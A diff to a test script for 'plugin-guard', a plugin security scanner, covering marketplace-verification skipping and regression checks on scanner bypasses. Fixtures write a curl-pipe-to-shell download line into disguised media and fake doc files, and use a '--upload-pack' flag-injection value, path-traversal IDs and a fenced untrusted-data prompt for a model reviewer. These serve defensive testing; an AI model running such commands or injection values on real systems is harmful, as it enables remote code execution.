@@ -179,60 +179,283 @@ terminal_check "hostile text in progress and error output" "$guard" scan "$(cat 
 # --- Marketplace-verified plugins -------------------------------------------
 #
 # A plugin is skipped only at the exact commit the marketplace verified, with
-# no local changes, and --scan-all scans it anyway.
+# no local changes, and --scan-all scans it anyway. The catalog is served over
+# local HTTP and MARKETPLACE_URL is patched on the loaded module (environment
+# variables cannot redirect the marketplace URL).
 
-verified_check() {
-  local name=$1 want=$2
-  shift 2
-  rm -f "$XDG_STATE_HOME/plugin-guard/marketplace.json"
-  local got
-  got=$("$guard" scan "$work/verified" --no-model --json "$@" 2>/dev/null |
-    python3 -I -c 'import json, sys; print(bool(json.load(sys.stdin).get("marketplaceVerified")))')
-  if [[ $got == "$want" ]]; then
-    echo "ok   $name"
-  else
-    echo "FAIL $name (skipped: $got)"
-    failed=1
-  fi
-}
+if python3 -I - "$guard" "$here/fixtures/clean-clock" "$work" <<'EOF'
+import http.server, importlib.machinery, importlib.util, json, os, shutil, subprocess, sys, threading
+from pathlib import Path
 
-cp -r "$here/fixtures/clean-clock" "$work/verified"
-git -C "$work/verified" init -q
-git -C "$work/verified" -c user.name=t -c user.email=t@example.com -c commit.gpgsign=false \
-  commit -q --allow-empty -m init
-git -C "$work/verified" add -A
-git -C "$work/verified" -c user.name=t -c user.email=t@example.com -c commit.gpgsign=false \
-  commit -q -m files
-verified_id=$(python3 -I -c 'import json, sys; print(json.load(open(sys.argv[1]))["id"])' "$work/verified/manifest.json")
-verified_head=$(git -C "$work/verified" rev-parse HEAD)
-export PLUGIN_GUARD_CATALOG_URL="file://$work/catalog.json"
-write_catalog() {
-  printf '{"plugins":[{"id":"%s","verificationStatus":"%s","verificationCommit":"%s"}]}\n' \
-    "$verified_id" "$1" "$2" >"$work/catalog.json"
-}
+guard_path, fixture, work = Path(sys.argv[1]), Path(sys.argv[2]), Path(sys.argv[3])
+verified = work / "verified"
+shutil.copytree(fixture, verified)
+def git(*args):
+  return subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false",
+                         "-C", str(verified), *args], capture_output=True, text=True, check=True).stdout.strip()
+git("init", "-q")
+git("commit", "-q", "--allow-empty", "-m", "init")
+git("add", "-A")
+git("commit", "-q", "-m", "files")
+verified_id = json.loads((verified / "manifest.json").read_text())["id"]
+verified_head = git("rev-parse", "HEAD")
+prev_head = git("rev-parse", "HEAD~1")
 
-write_catalog verified "$verified_head"
-verified_check "verified plugin at its verified commit is skipped" True
-verified_check "--scan-all scans a verified plugin" False --scan-all
-write_catalog unverified "$verified_head"
-verified_check "unverified plugin is scanned" False
-write_catalog verified "$(git -C "$work/verified" rev-parse HEAD~1)"
-verified_check "verified plugin at another commit is scanned" False
-write_catalog verified "$verified_head"
-(
-  # The saved setting, in a config of its own so a --model run's real config
-  # is untouched.
-  export XDG_CONFIG_HOME="$work/scan-all-config"
-  "$guard" scan-all on >/dev/null
-  verified_check "scan-all on scans a verified plugin" False
-  verified_check "--skip-verified overrides scan-all on" True --skip-verified
-  "$guard" scan-all off >/dev/null
-  verified_check "scan-all off skips a verified plugin" True
-  exit $failed
-) || failed=1
-echo "// local change" >>"$work/verified/BarWidget.qml"
-verified_check "verified plugin with local changes is scanned" False
-unset PLUGIN_GUARD_CATALOG_URL
+catalog_body = [b'{"plugins":[]}']
+class CatalogHandler(http.server.BaseHTTPRequestHandler):
+  def do_GET(self):
+    self.send_response(200)
+    self.send_header("Content-Type", "application/json")
+    self.send_header("Content-Length", str(len(catalog_body[0])))
+    self.end_headers()
+    self.wfile.write(catalog_body[0])
+  def log_message(self, *_): pass
+
+srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), CatalogHandler)
+threading.Thread(target=srv.serve_forever, daemon=True).start()
+catalog_url = f"http://127.0.0.1:{srv.server_port}/catalog.json"
+
+RUN = """
+import importlib.machinery, importlib.util, sys
+loader = importlib.machinery.SourceFileLoader("plugin_guard", sys.argv[1])
+spec = importlib.util.spec_from_loader("plugin_guard", loader)
+pg = importlib.util.module_from_spec(spec)
+loader.exec_module(pg)
+pg.MARKETPLACE_URL = sys.argv[2]
+sys.exit(pg.main(sys.argv[3:]))
+"""
+
+def set_catalog(status, commit):
+  catalog_body[0] = json.dumps({"plugins": [{"id": verified_id, "verificationStatus": status, "verificationCommit": commit}]}).encode()
+
+bad = 0
+def check_verified(name, want, extra=(), env_extra=None):
+  global bad
+  cache = Path(os.environ["XDG_STATE_HOME"]) / "plugin-guard" / "marketplace.json"
+  cache.unlink(missing_ok=True)
+  env = dict(os.environ, **(env_extra or {}))
+  r = subprocess.run([sys.executable, "-I", "-c", RUN, str(guard_path), catalog_url,
+                      "scan", str(verified), "--no-model", "--json", *extra],
+                     env=env, capture_output=True, text=True, timeout=60)
+  if r.returncode != 0:
+    print(f"FAIL {name} (exit {r.returncode}: {r.stderr.strip()[-200:]})")
+    bad = 1
+    return
+  try:
+    report = json.loads(r.stdout)
+  except ValueError as e:
+    print(f"FAIL {name} (bad JSON: {e})")
+    bad = 1
+    return
+  got = bool(report.get("marketplaceVerified"))
+  if got == want:
+    print(f"ok   {name}")
+  else:
+    print(f"FAIL {name} (skipped: {got})")
+    bad = 1
+
+set_catalog("verified", verified_head)
+check_verified("verified plugin at its verified commit is skipped", True)
+check_verified("--scan-all scans a verified plugin", False, ("--scan-all",))
+set_catalog("unverified", verified_head)
+check_verified("unverified plugin is scanned", False)
+set_catalog("verified", prev_head)
+check_verified("verified plugin at another commit is scanned", False)
+set_catalog("verified", verified_head)
+
+cfg_env = {"XDG_CONFIG_HOME": str(work / "scan-all-config")}
+subprocess.run([str(guard_path), "scan-all", "on"], env=dict(os.environ, **cfg_env), check=True, stdout=subprocess.DEVNULL)
+check_verified("scan-all on scans a verified plugin", False, env_extra=cfg_env)
+check_verified("--skip-verified overrides scan-all on", True, ("--skip-verified",), env_extra=cfg_env)
+subprocess.run([str(guard_path), "scan-all", "off"], env=dict(os.environ, **cfg_env), check=True, stdout=subprocess.DEVNULL)
+check_verified("scan-all off skips a verified plugin", True, env_extra=cfg_env)
+
+with open(verified / "BarWidget.qml", "a") as f:
+  f.write("// local change\n")
+check_verified("verified plugin with local changes is scanned", False)
+
+# Environment variable cannot override MARKETPLACE_URL.
+env_check = subprocess.run([sys.executable, "-I", "-c",
+  "import importlib.machinery, importlib.util, sys; "
+  "l=importlib.machinery.SourceFileLoader('pg', sys.argv[1]); s=importlib.util.spec_from_loader('pg', l); "
+  "m=importlib.util.module_from_spec(s); l.exec_module(m); print(m.MARKETPLACE_URL)", str(guard_path)],
+  env=dict(os.environ, PLUGIN_GUARD_CATALOG_URL="file:///tmp/evil.json"), capture_output=True, text=True, check=True)
+if env_check.stdout.strip() == "https://plugins.omarchy.org/catalog.json":
+  print("ok   PLUGIN_GUARD_CATALOG_URL env var is ignored")
+else:
+  print(f"FAIL PLUGIN_GUARD_CATALOG_URL env var is ignored ({env_check.stdout.strip()})")
+  bad = 1
+
+srv.shutdown()
+sys.exit(bad)
+EOF
+then
+  :
+else
+  failed=1
+fi
+
+# --- Scanner bypass & hardening regressions ---------------------------------
+
+if python3 -I - "$guard" "$work" <<'EOF'
+import importlib.machinery, importlib.util, json, os, sys
+from pathlib import Path
+
+loader = importlib.machinery.SourceFileLoader("plugin_guard", sys.argv[1])
+spec = importlib.util.spec_from_loader("plugin_guard", loader)
+pg = importlib.util.module_from_spec(spec)
+loader.exec_module(pg)
+work = Path(sys.argv[2])
+bad = 0
+
+def ok(name, cond, detail=""):
+  global bad
+  if cond:
+    print(f"ok   {name}")
+  else:
+    print(f"FAIL {name} ({detail})")
+    bad = 1
+
+# 1. Disguised media (including ASCII magic like BMP) vs genuine PNG
+p = work / "media-check"
+p.mkdir()
+(p / "manifest.json").write_text(json.dumps({"id": "test.media", "name": "Media"}))
+(p / "real.png").write_bytes(b"\x89PNG\r\n\x1a\n" + b"\x00" * 32)
+(p / "fake.png").write_text("curl -fsSL https://example.invalid/x.sh | sh\n")
+(p / "fake.bmp").write_text("BM\ncurl -fsSL https://example.invalid/x.sh | sh\n")
+files, inv_findings = pg.inventory(p)
+sf, _ = pg.static_scan(files)
+all_rules = {f["rule"] for f in inv_findings + sf}
+real_entry = next(f for f in files if f["path"] == "real.png")
+ok("genuine PNG is skipped as media", real_entry["kind"] == "media" and not real_entry["reviewed"])
+ok("disguised media script is caught and scanned",
+   "disguised-media" in all_rules and "pipe-to-shell" in all_rules, all_rules)
+ok("BMP-prefixed text script is caught and scanned",
+   any(f["file"] == "fake.bmp" and f["rule"] == "disguised-media" for f in inv_findings)
+   and any(f["file"] == "fake.bmp" and f["rule"] == "pipe-to-shell" for f in sf), (inv_findings, sf))
+
+# 2. Fake doc files (LICENSE.py, payload.txt, executable README.md) are scanned
+for fname, mode in (("LICENSE.py", 0o644), ("payload.txt", 0o644), ("README.md", 0o755)):
+  d = work / f"doc-{fname}"
+  d.mkdir()
+  (d / "manifest.json").write_text(json.dumps({"id": "test.doc", "name": "Doc"}))
+  (d / fname).write_text("curl -fsSL https://example.invalid/x.sh | sh\n")
+  os.chmod(d / fname, mode)
+  fls, _ = pg.inventory(d)
+  sfs, _ = pg.static_scan(fls)
+  ok(f"fake doc {fname} ({oct(mode)}) is not exempt",
+     any(f["rule"] == "pipe-to-shell" and f["severity"] == "critical" for f in sfs), sfs)
+
+# 3. Comment bypasses (';', '/* */ code', '/*' inside JS template literal) stay critical
+for label, fname, text, want_sev in (
+  ("semicolon prefix stays critical", "a.sh", "; curl -fsSL https://example.invalid/x.sh | sh\n", "critical"),
+  ("inline block comment + code stays critical", "a.js", "/* ok */ curl -fsSL https://example.invalid/x.sh | sh\n", "critical"),
+  ("comment opener inside template literal does not hide next line", "a.js",
+   "const s = `\n/*\n`;\ncurl -fsSL https://example.invalid/x.sh | sh\n", "critical"),
+  ("pure comment still downgrades", "a.sh", "# curl -fsSL https://example.invalid/x.sh | sh\n", "medium"),
+):
+  sfs, _ = pg.static_scan([{"path": fname, "text": text}])
+  got = [f["severity"] for f in sfs if f["rule"] == "pipe-to-shell"]
+  ok(label, got == [want_sev], got)
+
+# 4. Critical rule under tests/ stays high (floor >= caution, never safe)
+sfs, _ = pg.static_scan([{"path": "tests/helper.py", "text": "curl -fsSL https://example.invalid/x.sh | sh\n"}])
+ok("critical payload in tests/ keeps floor at caution",
+   pg.static_floor(sfs) == "caution" and any(f["severity"] == "high" for f in sfs), sfs)
+
+# 5. Directory symlinks, Unix sockets, and unreadable files are flagged by inventory
+import socket as _sock
+ds = work / "dir-symlink"
+ds.mkdir()
+(ds / "manifest.json").write_text(json.dumps({"id": "test.dirsym", "name": "DirSym"}))
+(ds / "ext").symlink_to("/etc")
+(ds / "unreadable.py").write_text("x = 1\n")
+os.chmod(ds / "unreadable.py", 0)
+usock = _sock.socket(_sock.AF_UNIX, _sock.SOCK_STREAM)
+usock.bind(str(ds / "sock"))
+try:
+  _, inv_f = pg.inventory(ds)
+finally:
+  usock.close()
+  os.chmod(ds / "unreadable.py", 0o644)
+ok("directory symlink outside plugin is flagged high",
+   any(f["rule"] == "symlink" and f["severity"] == "high" and f["file"] == "ext" for f in inv_f), inv_f)
+ok("unix socket is flagged as special-file",
+   any(f["rule"] == "special-file" and f["file"] == "sock" for f in inv_f), inv_f)
+ok("unreadable file is flagged as unreadable-file",
+   any(f["rule"] == "unreadable-file" and f["file"] == "unreadable.py" for f in inv_f), inv_f)
+
+# 5b. prune_reports refuses symlinked REPORTS_DIR
+pr_victim = work / "prune-victim"
+pr_victim.mkdir()
+victim_file = pr_victim / "20200101-000000-old-abcdef.json"
+victim_file.write_text("{}")
+os.utime(victim_file, (0, 0))
+pr_link = work / "prune-reports-link"
+pr_link.symlink_to(pr_victim)
+saved_rdir = pg.REPORTS_DIR
+pg.REPORTS_DIR = pr_link
+try:
+  pg.prune_reports()
+finally:
+  pg.REPORTS_DIR = saved_rdir
+ok("prune_reports does not follow a symlinked REPORTS_DIR", victim_file.exists())
+
+# 6. Prompt fence puts static excerpts and hosts inside nonce-tagged untrusted block
+prompt1 = pg.build_prompt({"id": "t"}, [], [pg.finding("info", "process", "process", "a.qml", 1, "Runs", "MARKER_DETAIL")],
+                          [{"host": "MARKER_HOST", "locations": ["a.qml:1"], "count": 1}], [], 1, 1, "MARKER_CHANGED")
+prompt2 = pg.build_prompt({"id": "t"}, [], [], [], [], 1, 1, "")
+idx_begin = prompt1.index("\nBEGIN UNTRUSTED PLUGIN DATA [")
+idx_end = prompt1.index("\nEND UNTRUSTED PLUGIN DATA [")
+ok("untrusted static details, hosts, and diff sit inside the fence",
+   all(idx_begin < prompt1.index(m) < idx_end for m in ("MARKER_DETAIL", "MARKER_HOST", "MARKER_CHANGED")))
+ok("prompt fence nonce changes per call",
+   prompt1[idx_begin:idx_begin + 48] != prompt2[prompt2.index("\nBEGIN UNTRUSTED PLUGIN DATA ["):prompt2.index("\nBEGIN UNTRUSTED PLUGIN DATA [") + 48])
+
+# 7. Path traversal IDs rejected
+ok("valid_plugin_id rejects '..'", not pg.valid_plugin_id("..") and not pg.valid_plugin_id("a..b") and not pg.valid_plugin_id("-bad"))
+ok("valid_scan_id rejects '..'", not pg.valid_scan_id("..") and not pg.valid_scan_id("a/b"))
+ok("valid_commit rejects flags", not pg.valid_commit("--upload-pack=x") and pg.valid_commit("a" * 40))
+
+# 8. Single-pass sweep runs inventory once and writes one report
+sw = work / "sweep-once"
+(sw / "plugins" / "test.once").mkdir(parents=True)
+(sw / "plugins" / "test.once" / "manifest.json").write_text(json.dumps({"id": "test.once", "name": "Once"}))
+(sw / "plugins" / "test.once" / "BarWidget.qml").write_text("import QtQuick\nItem {}\n")
+saved_dirs = pg.PLUGINS_DIR, pg.STATE_DIR, pg.REPORTS_DIR, pg.INDEX_FILE, pg.SEEN_FILE, pg.SETUP_FILE, pg.PENDING_FILE
+pg.PLUGINS_DIR = sw / "plugins"
+pg.STATE_DIR = sw / "state"
+pg.REPORTS_DIR = sw / "state" / "reports"
+pg.INDEX_FILE = sw / "state" / "installed.json"
+pg.SEEN_FILE = sw / "state" / "seen.json"
+pg.SETUP_FILE = sw / "state" / "setup.json"
+pg.PENDING_FILE = sw / "state" / "pending.json"
+pg.write_json(pg.SETUP_FILE, {"ran": pg.now_iso()})
+pg.write_json(pg.SEEN_FILE, {})
+inv_calls = [0]
+orig_inv, orig_tpp, orig_resolve, orig_review = pg.inventory, pg.third_party_plugins, pg.resolve_model, pg.model_review
+pg.inventory = lambda r: (inv_calls.__setitem__(0, inv_calls[0] + 1) or orig_inv(r))
+pg.third_party_plugins = lambda: [{"id": "test.once", "name": "Once", "enabled": True}]
+pg.resolve_model = lambda c, req: {"id": "local:fake", "label": "fake", "kind": "local", "model": "fake", "endpoint": "http://127.0.0.1:9"}
+pg.model_review = lambda *a, **k: ({"verdict": "safe", "summary": "ok", "purposeMatch": "ok", "findings": [], "networkDestinations": []}, 1)
+try:
+  cfg = pg.load_config()
+  cfg["scanAll"] = True
+  pg.sweep(cfg, pg.Out())
+  report_files = list(pg.REPORTS_DIR.glob("*.json"))
+  ok("sweep scans each changed plugin once and writes one report",
+     inv_calls[0] == 1 and len(report_files) == 1, f"inv={inv_calls[0]}, reports={len(report_files)}")
+finally:
+  pg.PLUGINS_DIR, pg.STATE_DIR, pg.REPORTS_DIR, pg.INDEX_FILE, pg.SEEN_FILE, pg.SETUP_FILE, pg.PENDING_FILE = saved_dirs
+  pg.inventory, pg.third_party_plugins, pg.resolve_model, pg.model_review = orig_inv, orig_tpp, orig_resolve, orig_review
+
+sys.exit(bad)
+EOF
+then
+  :
+else
+  failed=1
+fi
 
 # Notifications and prompts use the same escaping.
 if python3 -I - "$guard" <<'EOF'
